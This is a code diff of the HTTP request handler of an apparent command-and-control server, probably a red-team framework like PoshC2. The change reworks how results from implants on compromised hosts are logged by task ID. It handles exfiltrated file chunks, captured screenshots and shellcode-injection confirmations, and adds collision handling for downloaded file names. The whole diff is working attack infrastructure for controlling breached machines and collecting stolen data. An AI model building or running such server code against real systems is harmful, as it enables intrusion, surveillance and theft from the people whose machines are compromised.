@@ -226,7 +226,6 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
           cookieVal = (s.cookieHeader).replace("SessionID=","")
           post_data = s.rfile.read(content_length)
           logging.info("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n", str(s.path), str(s.headers), post_data)
-          
           now = datetime.datetime.now()
           result = get_implants_all()
           for i in result:
@@ -239,6 +238,18 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
             if RandomURI in s.path and cookieVal:
               update_implant_lastseen(now.strftime("%m/%d/%Y %H:%M:%S"),RandomURI)
               decCookie = decrypt(encKey, cookieVal)
+              if decCookie.startswith("Error"):
+                print (Colours.RED)
+                print ("The multicmd errored: ")
+                print (decrypt_bytes_gzip(encKey, post_data[1500:]))
+                print (Colours.GREEN)
+                s.send_response(200)
+                s.send_header("Content-type", "text/html")
+                s.end_headers()
+                s.wfile.write(default_response())
+                return
+              taskId = str(int(decCookie.strip('\x00')))
+              executedCmd = get_cmd_from_task_id(taskId)
               print (Colours.GREEN)
               print ("Command returned against implant %s on host %s\\%s @ %s (%s)" % (implantID, Domain, User, Hostname,now.strftime("%m/%d/%Y %H:%M:%S")))
               #print decCookie,Colours.END
@@ -246,52 +257,91 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
               outputParsed = re.sub(r'123456(.+?)654321', '', rawoutput)
               outputParsed = outputParsed.rstrip()
 
-              if "ModuleLoaded" in decCookie:
+              if "loadmodule" in executedCmd:
                 print ("Module loaded sucessfully")
-                insert_completedtask(RandomURI, decCookie, "Module loaded sucessfully", "")
-              if "get-screenshot" in decCookie.lower() or "screencapture" in decCookie.lower():
+                update_task(taskId, "Module loaded sucessfully")
+              if "get-screenshot" in executedCmd.lower() or "screencapture" in executedCmd.lower():
                 try:
                   decoded = base64.b64decode(outputParsed)
                   filename = i[3] + "-" + now.strftime("%m%d%Y%H%M%S_"+randomuri())
                   output_file = open('%s%s.png' % (DownloadsDirectory,filename), 'wb')
                   print ("Screenshot captured: %s%s.png" % (DownloadsDirectory,filename))
-                  insert_completedtask(RandomURI, decCookie, "Screenshot captured: %s%s.png" % (DownloadsDirectory,filename), "")
+                  update_task(taskId, "Screenshot captured: %s%s.png" % (DownloadsDirectory,filename))
                   output_file.write(decoded)
                   output_file.close()
                 except Exception as e:
-                  insert_completedtask(RandomURI, decCookie, "Screenshot not captured, the screen could be locked or this user does not have access to the screen!", "")
+                  update_task(taskId, "Screenshot not captured, the screen could be locked or this user does not have access to the screen!")
                   print ("Screenshot not captured, the screen could be locked or this user does not have access to the screen!")
-              elif (decCookie.lower().startswith("$shellcode64")) or (decCookie.lower().startswith("$shellcode64")):
-                insert_completedtask(RandomURI, decCookie, "Upload shellcode complete", "")
+              # What should this be now?
+              elif (executedCmd.lower().startswith("$shellcode64")) or (executedCmd.lower().startswith("$shellcode64")): 
+                update_task(taskId, "Upload shellcode complete") 
                 print ("Upload shellcode complete")
-              elif (decCookie.lower().startswith("run-exe core.program core inject-shellcode")):
-                insert_completedtask(RandomURI, decCookie, "Upload shellcode complete", "")
+              elif (executedCmd.lower().startswith("run-exe core.program core inject-shellcode")):
+                update_task(taskId, "Upload shellcode complete")
                 print (outputParsed)
-              elif "download-file" in decCookie.lower():
+              elif "download-file" in executedCmd.lower():
                 try:
                   rawoutput = decrypt_bytes_gzip(encKey, (post_data[1500:]))
-                  filename = decCookie.lower().replace("download-file ","")
+                  filename = executedCmd.lower().replace("download-file ","")
+                  filename = filename.replace("-source ","")
                   filename = filename.replace("..","")
+                  filename = filename.replace("'","")
+                  filename = filename.replace('"',"")
                   filename = filename.rsplit('/', 1)[-1]
                   filename = filename.rsplit('\\', 1)[-1]
                   filename = filename.rstrip('\x00')
-                  chunkNumber = rawoutput[:5]
-                  totalChunks = rawoutput[5:10]
-                  print ("Download file part %s of %s : %s" % (chunkNumber,totalChunks,filename))
-                  insert_completedtask(RandomURI, decCookie, "Download file part %s of %s : %s" % (chunkNumber,totalChunks,filename), "")
-                  output_file = open('%s/downloads/%s' % (ROOTDIR,filename), 'a')
-                  output_file.write(rawoutput[10:])
-                  output_file.close()
+                  original_filename = filename
+                  if rawoutput.startswith("Error"):
+                    print("Error downloading file: ")
+                    print rawoutput
+                  else:
+                    chunkNumber = rawoutput[:5]
+                    totalChunks = rawoutput[5:10]
+                    if (chunkNumber == "00001") and os.path.isfile('%s/downloads/%s' % (ROOTDIR,filename)):
+                      counter = 1
+                      while(os.path.isfile('%s/downloads/%s' % (ROOTDIR,filename))):
+                        if '.' in filename:
+                          filename = original_filename[:original_filename.rfind('.')] + '-' +  str(counter) + original_filename[original_filename.rfind('.'):]
+                        else:
+                          filename = original_filename + '-' +  str(counter)
+                        counter+=1
+                    if (chunkNumber != "00001"):
+                      counter = 1
+                      if not os.path.isfile('%s/downloads/%s' % (ROOTDIR,filename)):
+                        print("Error trying to download part of a file to a file that does not exist: %s" % filename)
+                      while(os.path.isfile('%s/downloads/%s' % (ROOTDIR,filename))):
+                        # First find the 'next' file would be downloaded to
+                        if '.' in filename:
+                          filename = original_filename[:original_filename.rfind('.')] + '-' +  str(counter) + original_filename[original_filename.rfind('.'):]
+                        else:
+                          filename = original_filename + '-' +  str(counter)
+                        counter+=1
+                      if counter != 2:
+                        # Then actually set the filename to this file - 1 unless it's the first one and exists without a counter
+                        if '.' in filename:
+                          filename = original_filename[:original_filename.rfind('.')] + '-' +  str(counter) + original_filename[original_filename.rfind('.'):]
+                        else:
+                          filename = original_filename + '-' +  str(counter)
+                      else:
+                        filename = original_filename
+                    print ("Download file part %s of %s to: %s" % (chunkNumber,totalChunks,filename))
+                    update_task(taskId, "Download file part %s of %s to: %s" % (chunkNumber,totalChunks,filename))
+                    output_file = open('%s/downloads/%s' % (ROOTDIR,filename), 'a')
+                    output_file.write(rawoutput[10:])
+                    output_file.close()
                 except Exception as e:
-                  insert_completedtask(RandomURI, decCookie, "Error downloading file %s " % e, "")
+                  update_task(taskId, "Error downloading file %s " % e)
                   print ("Error downloading file %s " % e)
                 
               else:
-                insert_completedtask(RandomURI, decCookie, outputParsed, "")
+                update_task(taskId, outputParsed)
                 print (Colours.GREEN)
                 print (outputParsed + Colours.END)
         except Exception as e:
           e = ""
+          # print e
+          # traceback.print_exc()
+          
         finally:
           s.send_response(200)
           s.send_header("Content-type", "text/html")
